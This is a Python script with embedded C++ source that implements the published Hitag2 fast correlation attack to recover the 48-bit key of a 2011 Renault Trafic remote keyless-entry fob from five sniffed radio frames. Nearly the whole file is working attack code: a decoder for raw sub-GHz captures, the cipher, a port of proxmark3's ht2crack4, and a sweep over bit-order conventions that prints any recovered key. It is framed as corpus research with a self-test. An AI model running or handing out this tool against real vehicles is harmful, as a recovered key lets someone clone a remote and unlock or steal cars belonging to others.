#!/usr/bin/env python3
"""Renault V1 (Hitag2) Layer-2 key recovery from the wire — the RKE correlation attack.

Background. closed the ProtoPirate *epoch/seed* model on the Trafic
corpus by exhausting the 32-bit IV space (exactly one chance-fixed-point IV per
frame, and a non-constant seed byte), and separately found that none of the
reference's 8 dictionary keys reproduces a hop. Those two negative results were
taken to mean the wire cannot yield the key and that side-channel extraction is
the only route left.

That conclusion was drawn without testing the one model that actually describes a
2011 Renault Trafic remote. The remote is an NXP PCF7946/7947: an 8-bit µC with a
Hitag2 cipher inside, and its rolling code is *keyed* rather than seed-based. The
scheme is documented in Garcia, Oswald, Kasper & Pavlides, "Lock It and Still Lose
It" (USENIX Security 2016), Section 4, and revisited in Benadjila et al., "One Car,
Two Frames" (WOOT'17), Section 3.3. Concretely:

    the 104-bit wire frame carries SYNC(16) UID(32) BTN(4) CNTRL(10) KS(32) CHK(8)
    the cipher state is seeded with UID and the low 16 key bits
    the 32-bit IV is (CNTRH || CNTRL || BTN), i.e. iv = ((CNTRH<<10 | CNTRL) << 4) | BTN
    the wire KS is the first 32 bits of Hitag2 keystream

The corpus frames carry UID, BTN, CNTRL and KS in the clear; only CNTRH (18 bits)
and the 48-bit key are secret. Garcia et al. recover the key from four to eight
such frames with a fast correlation attack; the corpus has five consecutive frames
with a counter walk of +1, which is exactly that input.

The counter-high guess is not even needed here. WOOT'17 proves an equivalent-key
property: running the cipher with IV (CNTRH||CNTRL||BTN) and key k produces the
same keystream as running it with IV (0||CNTRL||BTN) and key k' = k ^ (0^16 || CNTRH || 0^14).
Zeroing the unknown high part therefore yields an *equivalent* key that reproduces
the genuine keystream while CNTRH is unchanged — and the five frames sit inside one
1024-press block, so CNTRH is constant across them. No counter age guess, no 2^18
sweep.

This tool implements the cipher from the paper's definition (Definition 4.4 /
Appendix A), implements the Section 4.4 correlation attack, and drives both from a
corpus capture. The attack is the same algorithm as proxmark3's ht2crack4
(tools/hitag2crack/crack4), ported to the RKE convention where the IV is inserted
in plain rather than recovered from an encrypted nonce.

    python3 tools/renault_hitag2_rke_crack.py                # the corpus Trafic file
    python3 tools/renault_hitag2_rke_crack.py path/to/x.sub
    python3 tools/renault_hitag2_rke_crack.py --selftest     # synthetic round-trip only
    python3 tools/renault_hitag2_rke_crack.py --tbl 1000000 --ntr 5

The --selftest mode is the honesty check: it generates random keys, identifiers and
counter runs, computes the keystream with the paper's cipher, and requires the
attack to hand the key back. A pass there means the port is sound and any negative
on the corpus is a statement about the corpus, not about the code.
"""

import re
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
DEFAULT = (ROOT / "research/sources/corpus_automotive_subghz/European/Renault"
           / "Trafic 2011/Renault_trafic_2011_open_am1.sub")
CC = "clang++"

SRC = r"""
// Hitag2 Layer-2: the RKE correlation attack of Garcia, Oswald, Kasper & Pavlides,
// USENIX Security 2016, Section 4.4. The cipher is implemented from the paper's
// own definition (Definition 4.4 / Appendix A) so the attack and the round-trip
// check share no code with the firmware or with ProtoPirate. The attack loop is a
// faithful port of proxmark3's ht2crack4, with the one change the RKE scheme
// forces: the initialization vector is public (it is BTN and the counter, both on
// the wire) and is inserted in plain, where the immobilizer version of the tool
// recovers it from an encrypted reader nonce.
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cmath>
#include <cctype>
#include <thread>
#include <vector>
#include <algorithm>
#include <string>
typedef uint8_t u8; typedef uint16_t u16; typedef uint32_t u32; typedef uint64_t u64;

/* ─────────────────────────────────────────────────────────────────────────────
   Layer 1: the 104-bit Hitag2 wire frame (same decoder the other Renault tools
   use, so frames are read identically across the toolchain)
   ───────────────────────────────────────────────────────────────────────────── */
#define LO_MIN 1350U
#define LO_MAX 1850U
#define HI_MIN  870U
#define HI_MAX 1130U
static const u8 TR[4]={0x01,0x91,0x9B,0xFB};
static bool hdrLow(u32 d){ return d>=LO_MIN&&d<=LO_MAX; }
static u32 dataThr(u16 te){ u32 t=(u32)te*3U; if(t<300U)return 150U; if(t>=422U)return 210U; return t/2U; }
static u16 adaptTe(u16 te,u32 d){ u32 m=(u32)te*7U+d; if(m<560U)return 70; if(m>=1488U)return 185; return (u16)(m/8U); }
static u8 frameXor(const u8 r[11]){ u8 v=0; for(int i=0;i<10;i++) v^=r[i]; return v; }
static void packKey(u64 key,u64 k2,u8 r[11]){ for(int i=0;i<8;i++) r[i]=(u8)(key>>(8*(7-i))); r[8]=(u8)(k2>>16); r[9]=(u8)(k2>>8); r[10]=(u8)k2; }

struct Wire { u32 sn; u8 btn; u16 cnt10; u32 hop; u8 tail; u8 raw[11]; };
static Wire gWire[32]; static int gNWire=0;

struct Dec {
  int step=0; u32 te_last=0; int mstate=0; u16 te_high=120,te_low=150;
  u64 acc=0; u32 cnt=0; u16 header=0; u64 data=0,key2=0;
  bool valid=false; u64 lastD=0,lastD2=0; bool got=false;
  void feed(bool level,u32 d){
    for(;;){
      if(step==0){ if(!level&&hdrLow(d)){ te_last=d; step=2; } return; }
      if(step==2){
        if(level){ if(d<HI_MIN||d>HI_MAX||te_last<LO_MIN||te_last>LO_MAX){ step=0; return; }
          acc=0; cnt=0; mstate=0; te_high=120; te_low=150; step=3; return; }
        step=0; if(hdrLow(d)){ te_last=d; step=2; } return;
      }
      if(d<=49U) return;
      if(d>520U){ step=0; continue; }
      u16* te = level? &te_high : &te_low; int ev;
      if(d>dataThr(*te)) ev = level?6:4; else { ev=level?2:0; *te=adaptTe(*te,d); }
      int ns=(TR[mstate]>>ev)&0x3; bool hb=false,bit=false;
      if(ns==mstate) ns=1; else if(ns==2){ hb=true; } else if(ns==1){ hb=true; bit=true; }
      mstate=ns; if(!hb) return;
      acc=(acc<<1)|(bit?1ULL:0ULL); cnt++;
      if(cnt==16){ header=(u16)~acc; acc=0; return; }
      if(cnt==80){ data=~acc; acc=0; return; }
      if(cnt==104){
        key2=(~acc)&0xFFFFFFULL;
        if(header==1U){
          u8 r[11]; packKey(data,key2,r);
          if(frameXor(r)==r[10] && !(valid&&lastD==data&&lastD2==key2)){
            lastD=data; lastD2=key2; valid=true; got=true;
            if(gNWire<32){
              Wire& w=gWire[gNWire++];
              memcpy(w.raw,r,11);
              w.sn=(u32)(data>>32);
              w.btn=(u8)(r[4]>>4);
              w.cnt10=(u16)(((u16)(r[4]&0x0F)<<6)|(r[5]>>2));
              w.hop=((u32)(r[5]&3)<<30)|((u32)r[6]<<22)|((u32)r[7]<<14)|((u32)r[8]<<6)|(r[9]>>2);
              w.tail=(u8)(r[9]&3);
            }
          }
        }
        acc=0; cnt=0; step=3;
      }
      return;
    }
  }
};

/* ─────────────────────────────────────────────────────────────────────────────
   The Hitag2 cipher, straight from Appendix A of the paper.

   State representation: a 48-bit register whose bit j is a_j (bit 0 is a_0).
   The paper's "shift" keeps a_i at bit i, so advancing one clock is a right
   shift with the new bit entering at bit 47.
   ───────────────────────────────────────────────────────────────────────────── */
#define PB22(S,A,B)       ( ((S>>A)&3) | ((S>>((B)-2))&0xC) )
#define PB14(S,A,B,C,D)   ( ((S>>A)&1) | ((S>>((B)-1))&2) | ((S>>((C)-2))&4) | ((S>>((D)-3))&8) )
#define PB112(S,A,B,C)    ( ((S>>A)&1) | ((S>>((B)-1))&2) | ((S>>((C)-2))&0xC) )
#define PB211(S,A,B,C)    ( ((S>>A)&3) | ((S>>((B)-2))&4) | ((S>>((C)-3))&8) )
#define PB121(S,A,B,C)    ( ((S>>A)&1) | ((S>>((B)-1))&6) | ((S>>((C)-3))&8) )

// f(x0..x47) = fc( fa(x2x3x5x6), fb(x8x12x14x15), fb(x17x21x23x26),
//                  fb(x28x29x31x33), fa(x34x43x44x46) )
// with fa = 0xA63C, fb = 0xA770, fc = 0xD949CBB0. The filter only reads
// x2,x3,x5..x46, so it is a function of twenty bits of the state.
static u64 hcrypt(u64 s){
  u64 bi;
  bi  = (0x2C79ULL >> PB22(s,2,5)) & 1ULL;
  bi |= ((0x6671ULL << 1) >> PB112(s,8,12,14)) & 0x02ULL;
  bi |= ((0x6671ULL << 2) >> PB14(s,17,21,23,26)) & 0x04ULL;
  bi |= ((0x6671ULL << 3) >> PB211(s,28,31,33)) & 0x08ULL;
  bi |= ((0x2C79ULL << 4) >> PB121(s,34,43,46)) & 0x10ULL;
  return (0x7907287BULL >> bi) & 1ULL;
}

// L(x0..x47) = x0^x2^x3^x6^x7^x8^x16^x22^x23^x26^x30^x41^x42^x43^x46^x47
static u64 fnL(u64 x){
  u64 t = x ^ (x>>1);
  return ( x ^ (x>>6) ^ (x>>16) ^ (x>>26) ^ (x>>30) ^ (x>>41)
           ^ (t>>2) ^ (t>>7) ^ (t>>22) ^ (t>>42) ^ (t>>46) ) & 1ULL;
}

// Reference f built directly from the paper's boolean tables, index read
// most-significant-bit first, used only to cross-check hcrypt().
static u8 paperF(u64 s){
  u64 b2=(s>>2)&1,b3=(s>>3)&1,b5=(s>>5)&1,b6=(s>>6)&1;
  u64 b8=(s>>8)&1,b12=(s>>12)&1,b14=(s>>14)&1,b15=(s>>15)&1;
  u64 b17=(s>>17)&1,b21=(s>>21)&1,b23=(s>>23)&1,b26=(s>>26)&1;
  u64 b28=(s>>28)&1,b29=(s>>29)&1,b31=(s>>31)&1,b33=(s>>33)&1;
  u64 b34=(s>>34)&1,b43=(s>>43)&1,b44=(s>>44)&1,b46=(s>>46)&1;
  u64 ia = (b2<<3)|(b3<<2)|(b5<<1)|b6;
  u64 ib1= (b8<<3)|(b12<<2)|(b14<<1)|b15;
  u64 ib2= (b17<<3)|(b21<<2)|(b23<<1)|b26;
  u64 ib3= (b28<<3)|(b29<<2)|(b31<<1)|b33;
  u64 ia2= (b34<<3)|(b43<<2)|(b44<<1)|b46;
  u64 fa1=(0xA63CULL>>(15-ia))&1, fb1=(0xA770ULL>>(15-ib1))&1;
  u64 fb2=(0xA770ULL>>(15-ib2))&1, fb3=(0xA770ULL>>(15-ib3))&1;
  u64 fa2=(0xA63CULL>>(15-ia2))&1;
  u64 idx=(fa1<<4)|(fb1<<3)|(fb2<<2)|(fb3<<1)|fa2;
  return (u8)((0xD949CBB0ULL>>(31-idx))&1);
}

// Keystream: seed the state with id and the low 16 key bits, mix the 32-bit iv
// in during 32 non-linear cycles, then run the LFSR and read 32 bits. Output is
// ks0..ks31 with ks0 in bit 0 (the wire sends ks0 first).
static u32 encryptKs(u32 id, u32 iv, u64 key, u64* stateAfterInit){
  u64 st = (u64)id | ((key & 0xFFFFULL) << 32);
  for(int i=0;i<32;i++){
    u64 f = hcrypt(st);
    u64 nb = ((key >> (16+i)) & 1ULL) ^ ((u64)((iv >> i) & 1U)) ^ f;
    st = (st >> 1) | (nb << 47);
  }
  if(stateAfterInit) *stateAfterInit = st;
  u32 ks = 0;
  for(int i=0;i<32;i++){
    if(hcrypt(st)) ks |= (1U << i);
    st = (st >> 1) | (fnL(st) << 47);
  }
  return ks;
}

/* ─────────────────────────────────────────────────────────────────────────────
   The correlation attack (Section 4.4), ported from ht2crack4.

   A guess is the low n bits of the key, k0..k(n-1), for n from 16 up to 48.
   With the low 16 bits in the state and UID fixed, and the inserted bits
   a(48+i) = k(16+i) ^ iv_i ^ f(a_i..a(47+i)), a guess fixes the state window
   a32..a(31+n); the score is the likelihood of the observed keystream under the
   2^(20-known) completions of the twenty filter inputs. Each round keeps the best
   half of the table and extends every survivor by one key bit.
   ───────────────────────────────────────────────────────────────────────────── */
#define MAXN 32
struct Guess { u64 key; double score; u64 b[MAXN]; };

static Guess* Gt=NULL; static u32 numG=0, maxTbl=400000;
static int nTr=0; static u32 UID=0; static u32 IVs[MAXN]; static u32 KSs[MAXN];

static u64 pickbits2_2(u64 S,int A,int B){ return ((S>>A)&3)|((S>>(B-2))&0xC); }
static u64 pickbits1x4(u64 S,int A,int B,int C,int D){
  return ((S>>A)&1)|((S>>(B-1))&2)|((S>>(C-2))&4)|((S>>(D-3))&8); }
static u64 pickbits1_1_2(u64 S,int A,int B,int C){
  return ((S>>A)&1)|((S>>(B-1))&2)|((S>>(C-2))&0xC); }
static u64 pickbits2_1_1(u64 S,int A,int B,int C){
  return ((S>>A)&3)|((S>>(B-2))&4)|((S>>(C-3))&8); }
static u64 pickbits1_2_1(u64 S,int A,int B,int C){
  return ((S>>A)&1)|((S>>(B-1))&6)|((S>>(C-3))&8); }

static u64 packstate(u64 s){
  u64 p = pickbits2_2(s,2,5);
  p |= pickbits1_1_2(s,8,12,14) << 4;
  p |= pickbits1x4(s,17,21,23,26) << 8;
  p |= pickbits2_1_1(s,28,31,33) << 12;
  p |= pickbits1_2_1(s,34,43,46) << 16;
  return p;
}
static u64 f20(u64 y){
  u64 bi;
  bi  = (0x2C79ULL >> (y & 0xf)) & 1ULL;
  bi |= ((0x6671ULL << 1) >> ((y>>4) & 0xf)) & 0x02ULL;
  bi |= ((0x6671ULL << 2) >> ((y>>8) & 0xf)) & 0x04ULL;
  bi |= ((0x6671ULL << 3) >> ((y>>12) & 0xf)) & 0x08ULL;
  bi |= ((0x2C79ULL << 4) >> ((y>>16) & 0xf)) & 0x10ULL;
  return (0x7907287BULL >> bi) & 1ULL;
}

// probability a one/zero from each filter circuit, given a known least-significant
// pattern; first index is the number of known bits, second the pattern.
static double pfna[][8] = {
  {0.50000,0.50000,},
  {0.50000,0.50000,0.50000,0.50000,},
  {0.50000,0.00000,0.50000,1.00000,0.50000,1.00000,0.50000,0.00000,},
};
static double pfnb[][8] = {
  {0.62500,0.37500,},
  {0.50000,0.75000,0.75000,0.00000,},
  {0.50000,0.50000,0.50000,0.00000,0.50000,1.00000,1.00000,0.00000,},
};
static double pfnc[][16] = {
  {0.50000,0.50000,},
  {0.62500,0.62500,0.37500,0.37500,},
  {0.75000,0.50000,0.25000,0.75000,0.50000,0.75000,0.50000,0.00000,},
  {1.00000,1.00000,0.50000,0.50000,0.50000,0.50000,0.50000,0.00000,
   0.50000,0.00000,0.00000,1.00000,0.50000,1.00000,0.50000,0.00000,},
};
static unsigned int packed_size[] = { 0,0,0,1,2,2,3,4,4,5,5,5,5,6,6,7,8,
  8,9,9,9,9,10,10,11,11,11,12,12,13,14,14,15,15,16,17,17,17,17,17,17,17,17,17,18,19,19,20,20 };

static double bit_score(u64 s, u64 size, u64 b){
  u64 packed, chopped; unsigned n; u64 b1; double nibprob1,nibprob0,prob; unsigned fncinput;
  chopped = s & ((1ULL<<size)-1ULL);
  packed = packstate(chopped);
  n = packed_size[size];
  b1 = b & 1ULL;
  if(n==0) return 0.5;
  else if(n<4){
    nibprob1 = pfna[n-1][packed];
    nibprob0 = 1.0 - nibprob1;
    prob = (nibprob0*pfnc[0][0]) + (nibprob1*pfnc[0][1]);
  } else if(n<20){
    fncinput = (unsigned)((0x2C79ULL >> (packed & 0xf)) & 1ULL);
    fncinput |= (unsigned)(((0x6671ULL << 1) >> ((packed>>4) & 0xf)) & 0x02ULL);
    fncinput |= (unsigned)(((0x6671ULL << 2) >> ((packed>>8) & 0xf)) & 0x04ULL);
    fncinput |= (unsigned)(((0x6671ULL << 3) >> ((packed>>12) & 0xf)) & 0x08ULL);
    fncinput |= (unsigned)(((0x2C79ULL << 4) >> ((packed>>16) & 0xf)) & 0x10ULL);
    fncinput = fncinput & ((1u << (n/4)) - 1u);
    if((n%4)==0) prob = pfnc[(n/4)-1][fncinput];
    else if(n<=16){
      nibprob1 = pfnb[(n%4)-1][packed >> ((n/4)*4)];
      nibprob0 = 1.0 - nibprob1;
      prob = (nibprob0*pfnc[n/4][fncinput]) + (nibprob1*pfnc[n/4][fncinput | (1u<<(n/4))]);
    } else {
      nibprob1 = pfna[(n%4)-1][packed >> 16];
      nibprob0 = 1.0 - nibprob1;
      prob = (nibprob0*((0x7907287BULL>>fncinput)&1ULL))
           + (nibprob1*((0x7907287BULL>>(fncinput|0x10))&1ULL));
    }
  } else {
    prob = (double)f20(packed);
  }
  return b1 ? prob : (1.0 - prob);
}

static double score(u64 s, unsigned size, u64 ks, unsigned kssize){
  double sc;
  if(size==1 || kssize==1){
    sc = bit_score(s, size, ks & 1ULL);
    return sc * (double)(packed_size[size]+1);
  } else {
    sc = bit_score(s, size, ks & 1ULL);
    if(sc==0.0) return 0.0;
    double sc2 = score(s>>1, size-1, ks>>1, kssize-1);
    if(sc2==0.0) return 0.0;
    return sc*(double)(packed_size[size]+1) + sc2;
  }
}

// Rebuild a(j)..a(j+47) for j = size-16: the state window that produces the next
// filter bit during randomization. Bits below 48 are UID and key; the inserted
// bits above are k(16+u) ^ iv_u ^ f_u, all known once the guess reaches size.
static u64 build_state(int i, u64 key, u32 iv, u64 b){
  u64 st=0;
  for(int t=0;t<48;t++){
    int j=i+t; int bit;
    if(j<32) bit=(int)((UID>>j)&1U);
    else if(j<48) bit=(int)((key>>(j-32))&1ULL);
    else { int u=j-48; bit=(int)(((key>>(16+u))&1ULL)^((u64)((iv>>u)&1U))^((b>>u)&1ULL)); }
    st |= (u64)(bit&1) << t;
  }
  return st;
}

static void score_traces(Guess* g, unsigned size){
  double total=0.0;
  for(int i=0;i<nTr;i++){
    u64 st = build_state((int)size-16, g->key, IVs[i], g->b[i]);
    g->b[i] |= (hcrypt(st) << (size-16));
    u64 st32 = g->key ^ ((u64)(IVs[i] ^ (u32)g->b[i]) << 16);
    double sc = score(st32, size, (u64)KSs[i], 32);
    if(sc==0.0){ g->score=0.0; return; }
    total += sc;
  }
  g->score = total / (double)nTr;
}

static void score_range(unsigned start, unsigned end, unsigned size){
  for(unsigned i=start;i<end;i++) score_traces(&Gt[i], size);
}

static void score_all(unsigned size, int nthreads){
  unsigned chunk = numG / (unsigned)nthreads;
  std::vector<std::thread> th;
  for(int t=0;t<nthreads;t++){
    unsigned s=t*chunk, e=(t==nthreads-1)?numG:(t+1)*chunk;
    th.emplace_back(score_range, s, e, size);
  }
  for(auto& x: th) x.join();
}

static int cmp_guess(const void* a, const void* b){
  const Guess* a1=(const Guess*)a; const Guess* b1=(const Guess*)b;
  if(a1->score < b1->score) return 1;
  if(a1->score > b1->score) return -1;
  return 0;
}

static void expand(unsigned halfsize, unsigned size){
  for(unsigned i=0;i<halfsize;i++){
    Gt[i+halfsize].key = Gt[i].key | (1ULL << size);
    Gt[i+halfsize].score = Gt[i].score;
    memcpy(Gt[i+halfsize].b, Gt[i].b, sizeof(u64)*nTr);
  }
}

static bool run_attack(int nthreads, bool verbose){
  Gt=(Guess*)calloc(maxTbl,sizeof(Guess));
  if(!Gt){ printf("alloc failed\n"); return false; }
  numG=65536;
  for(u32 i=0;i<numG;i++){ Gt[i].key=i; Gt[i].score=-1.0;
    for(int j=0;j<nTr;j++) Gt[i].b[j]=0; }
  for(unsigned size=16; size<=48; size++){
    score_all(size, nthreads);
    qsort(Gt, numG, sizeof(Guess), cmp_guess);
    unsigned halfsize = (numG < (maxTbl/2)) ? numG : (maxTbl/2);
    expand(halfsize, size);
    numG = halfsize*2;
    if(verbose)
      fprintf(stderr,"  round %2u size=%2u  guesses=%u  top=%.6f  min=%.6f\n",
              size-16, size, numG, Gt[0].score, Gt[numG-1].score);
  }
  // Final validation: a candidate must reproduce the keystream on every trace,
  // which is strictly stronger than the reference's two-trace test.
  bool found=false;
  for(u32 i=0;i<numG;i++){
    u64 k=Gt[i].key;
    bool ok=true;
    for(int j=0;j<nTr && ok;j++)
      if(encryptKs(UID, IVs[j], k, NULL) != KSs[j]) ok=false;
    if(ok){
      printf("KEY %012llX\n",(unsigned long long)k);
      found=true;
      break;
    }
  }
  free(Gt); Gt=NULL;
  return found;
}

/* ─────────────────────────────────────────────────────────────────────────────
   Convention sweep: the wire gives UID and KS as bit strings in an order this
   bench has never pinned down. Rather than guess once, try the small set of
   plausible readings and accept a hit only when it reproduces every frame.
   ───────────────────────────────────────────────────────────────────────────── */
static u32 rev32(u32 x){
  x = ((x & 0x55555555u)<<1) | ((x & 0xAAAAAAAAu)>>1);
  x = ((x & 0x33333333u)<<2) | ((x & 0xCCCCCCCCu)>>2);
  x = ((x & 0x0F0F0F0Fu)<<4) | ((x & 0xF0F0F0F0u)>>4);
  x = (x<<24) | ((x&0xFF00u)<<8) | ((x>>8)&0xFF00u) | (x>>24);
  return x;
}
static u32 byteswap(u32 x){ return ((x&0xFFu)<<24)|((x&0xFF00u)<<8)|((x>>8)&0xFF00u)|(x>>24); }

static int try_convention(int ui, int ki, int kc, int li, int nthreads, bool verbose){
  // uid reading
  u32 uid = gWire[0].sn;
  if(ui==1) uid = rev32(uid);
  else if(ui==2) uid = byteswap(uid);
  else if(ui==3) uid = rev32(byteswap(uid));
  UID = uid;
  nTr = 0;
  int n = (gNWire<MAXN)?gNWire:MAXN;
  for(int j=0;j<n;j++){
    u32 hop = gWire[j].hop;
    if(ki==1) hop = rev32(hop);
    if(kc) hop = hop ^ 0xFFFFFFFFu;
    u32 cnt = gWire[j].cnt10;
    u32 btn = (u32)gWire[j].btn;
    // Two IV layouts seen in the field. Standard (PCF7946 reference) is
    // iv = (CNTRH||CNTRL)<<4 | BTN; the counter high part is zeroed because the
    // equivalent-key property absorbs it. The hardened layout Benadjila et al.
    // found moves the unknown high part to the *low* bits and puts the button
    // high: iv = BTN<<28 | CNTRL<<18 | MSK, and MSK is zeroed the same way.
    u32 iv = (li==0) ? ((cnt<<4) | btn) : ((btn<<28) | (cnt<<18));
    IVs[nTr]=iv; KSs[nTr]=hop; nTr++;
  }
  if(verbose){
    fprintf(stderr,"trying uid=%08X ks_order=%d ks_comp=%d iv_layout=%d  (iv0=%08X ks0=%08X)\n",
            UID, ki, kc, li, IVs[0], KSs[0]);
  }
  return run_attack(nthreads, verbose) ? 1 : 0;
}

/* ─────────────────────────────────────────────────────────────────────────────
   Self test: independent round trip. Generate random keys, identifiers and
   counter runs, produce keystream with encryptKs(), then require the attack to
   return the key. This is the check that separates "the corpus is silent" from
   "the port is broken".
   ───────────────────────────────────────────────────────────────────────────── */
static u64 rng_state=0x243F6A8885A308D3ULL;
static u64 xrng(){
  rng_state ^= rng_state<<13; rng_state ^= rng_state>>7; rng_state ^= rng_state<<17;
  return rng_state;
}
static int selftest(int ntraces, int ntrials, int nthreads, bool verbose, int consec){
  int wins=0;
  for(int trial=0; trial<ntrials; trial++){
    u64 key = xrng() & 0xFFFFFFFFFFFFULL;
    u32 uid = (u32)(xrng() & 0xFFFFFFFFu);
    UID=uid; nTr=ntraces;
    for(int j=0;j<ntraces;j++){
      // consecutive: the counter walks +1 like the corpus. spread: independent
      // draws, which is what the paper says behaves better.
      u32 cnt = consec ? (0x15C + (u32)j) : (u32)(xrng() % 0x3FFu);
      IVs[j] = (cnt<<4) | 2u;
      KSs[j] = encryptKs(uid, IVs[j], key, NULL);
    }
    bool ok = run_attack(nthreads, false);
    if(verbose || !ok)
      fprintf(stderr,"  trial %d: key=%012llX uid=%08X  %s\n",
              trial,(unsigned long long)key,uid, ok?"recovered":"MISS");
    if(ok) wins++;
  }
  printf("selftest: %d/%d recovered (ntraces=%d, %s)\n", wins, ntrials,
         ntraces, consec?"consecutive":"spread");
  return wins;
}

static void sanity(void){
  // f built from the paper's tables must match the pipelined filter, and the
  // packed form must match both.
  int bad=0;
  for(int i=0;i<200000;i++){
    u64 s = (xrng() ^ (xrng()<<21) ^ (xrng()<<42));
    u64 h = hcrypt(s);
    if(h != (u64)paperF(s)) bad++;
    if(h != f20(packstate(s))) bad++;
  }
  fprintf(stderr,"cipher sanity: %s (%d mismatches over 200000 random states)\n",
          bad?"FAIL":"ok", bad);
}

int main(int argc,char**argv){
  std::string mode = (argc>1)?argv[1]:"cap";
  int nthreads=8; bool verbose=false; int ntraces=0;
  std::string path;
  for(int i=1;i<argc;i++){
    std::string a=argv[i];
    if(a=="--tbl" && i+1<argc){ maxTbl=(u32)atoi(argv[++i]); }
    else if(a=="--ntr" && i+1<argc){ ntraces=atoi(argv[++i]); }
    else if(a=="--threads" && i+1<argc){ nthreads=atoi(argv[++i]); }
    else if(a=="-v"){ verbose=true; }
    else if(a.size() && a[0]!='-'){ if(mode=="syn"||mode=="cap"||mode=="dec") path=a; }
  }
  srand(1);
  sanity();
  if(mode=="syn"){
    int nt = ntraces?ntraces:4;
    int trials = 3;
    int consec = 0;
    for(int i=1;i<argc;i++){
      std::string a=argv[i];
      if(a=="--trials" && i+1<argc) trials=atoi(argv[++i]);
      if(a=="--consec") consec=1;
    }
    selftest(nt, trials, nthreads, true, consec);
    return 0;
  }
  if(path.empty()) path="";
  FILE* f=NULL;
  if(!path.empty()) f=fopen(path.c_str(),"r");
  if(!f) f=stdin;
  std::vector<int> v; int x;
  while(fscanf(f,"%d",&x)==1) v.push_back(x);
  if(f!=stdin) fclose(f);
  Dec d;
  for(size_t i=0;i<v.size();i++){ int p=v[i]; d.feed(p>0,(u32)(p<0? -p : p)); }
  if(mode=="dec"){
    printf("%d\n", gNWire);
    for(int i=0;i<gNWire;i++)
      printf("  uid=%08X btn=%u cnt=%03X ks=%08X\n",
             gWire[i].sn, gWire[i].btn, gWire[i].cnt10, gWire[i].hop);
    return 0;
  }
  printf("frames decoded: %d\n", gNWire);
  if(gNWire<4){ printf("need at least 4 frames for the correlation attack\n"); return 1; }
  if(gNWire>=1){
    printf("uid=%08X btn=%u cnt=%03X ks=%08X  (first frame)\n",
           gWire[0].sn, gWire[0].btn, gWire[0].cnt10, gWire[0].hop);
  }
  printf("running the Section 4.4 correlation attack (table=%u, traces=%d)\n",
         maxTbl, ntraces?ntraces:gNWire);
  int hit=-1;
  for(int ui=0; ui<4 && hit<0; ui++)
    for(int ki=0; ki<2 && hit<0; ki++)
      for(int kc=0; kc<2 && hit<0; kc++)
        for(int li=0; li<2 && hit<0; li++)
          hit = try_convention(ui,ki,kc,li,nthreads,true);
  if(hit>0) printf("\nrecovered an equivalent key (see the note for what it opens)\n");
  else printf("\nno key from any convention — see the note for what that means\n");
  return hit>0?0:1;
}
"""


def parse_signed(path):
    raw = []
    for line in Path(path).read_text(errors="replace").splitlines():
        if line.startswith("RAW_Data:"):
            raw.extend(int(x) for x in re.findall(r"-?\d+", line[9:]))
    return raw


def build(cc):
    td = tempfile.mkdtemp(prefix="hitag2rke_")
    cpp = Path(td) / "crack.cpp"
    cpp.write_text(SRC)
    exe = Path(td) / "crack"
    cmd = [cc, "-O3", "-std=c++17", "-pthread", "-w"]
    # march=native is a big win for the inner loop; fall back if the host dislikes it
    r = subprocess.run(cmd + ["-march=native", "-o", str(exe), str(cpp)],
                       capture_output=True, text=True)
    if r.returncode:
        r = subprocess.run(cmd + ["-o", str(exe), str(cpp)], capture_output=True, text=True)
    if r.returncode:
        print("did not compile:\n" + r.stderr[:1500])
        return None
    return exe


def main():
    args = sys.argv[1:]
    if "--help" in args or "-h" in args:
        print(__doc__)
        return 0

    mode = "cap"
    rest = []
    for a in args:
        if a == "--selftest":
            mode = "syn"
        elif a == "--scan":
            mode = "dec"
        else:
            rest.append(a)

    exe = build(CC)
    if exe is None:
        return 2

    if mode == "syn":
        nt = "4"
        if "--ntr" in rest:
            nt = rest[rest.index("--ntr") + 1]
        extra = [a for a in rest if a in ("--consec",)]
        if "--trials" in rest:
            extra += ["--trials", rest[rest.index("--trials") + 1]]
        out = subprocess.run([str(exe), "syn", "--ntr", nt, "-v"] + extra,
                             capture_output=True, text=True)
        print(out.stdout.rstrip())
        if out.stderr.strip():
            print(out.stderr.rstrip())
        return 0

    if mode == "dec":
        # Walk every capture in the corpus and report how many Hitag2 frames each
        # yields. The correlation attack wants as many as possible; the point of
        # the sweep is to find whether any capture carries a usable run.
        corpus = ROOT / "research/sources/corpus_automotive_subghz"
        rows = []
        for sub in sorted(corpus.rglob("*.sub")):
            raw = parse_signed(sub)
            if len(raw) < 100:
                continue
            td = tempfile.mkdtemp(prefix="hitag2scan_")
            inp = Path(td) / "in.txt"
            inp.write_text("\n".join(str(x) for x in raw))
            out = subprocess.run([str(exe), "dec", str(inp)],
                                 capture_output=True, text=True)
            first = out.stdout.splitlines()[0] if out.stdout.splitlines() else "0"
            try:
                n = int(first.strip())
            except ValueError:
                n = 0
            if n > 0:
                rows.append((n, str(sub.relative_to(corpus)), out.stdout))
        rows.sort(reverse=True)
        print(f"{len(rows)} capture(s) decode at least one Hitag2 frame:\n")
        for n, rel, dump in rows[:40]:
            print(f"  {n} frame(s)  {rel}")
        if rows:
            print("\nbest capture detail:\n" + rows[0][2].rstrip())
        return 0

    # pick the capture path: the first positional that is not the value of an
    # option (--tbl/--ntr/--threads all take a following value)
    src = None
    i = 0
    takes_val = {"--tbl", "--ntr", "--threads", "--trials"}
    while i < len(rest):
        a = rest[i]
        if a in takes_val:
            i += 2
            continue
        if not a.startswith("-"):
            src = a
            break
        i += 1
    if src is None:
        src = str(DEFAULT)
    if not Path(src).exists():
        print(f"capture not found: {src}")
        return 2
    raw = parse_signed(src)
    if len(raw) < 200:
        print(f"capture too short ({len(raw)} pulses)")
        return 2

    td = tempfile.mkdtemp(prefix="hitag2rke_in_")
    inp = Path(td) / "in.txt"
    inp.write_text("\n".join(str(x) for x in raw))

    cmd = [str(exe), "cap", str(inp)] + [a for a in rest if a != src]
    out = subprocess.run(cmd, capture_output=True, text=True)
    print(out.stdout.rstrip())
    if out.stderr.strip():
        print(out.stderr.rstrip())
    return out.returncode


if __name__ == "__main__":
    sys.exit(main())
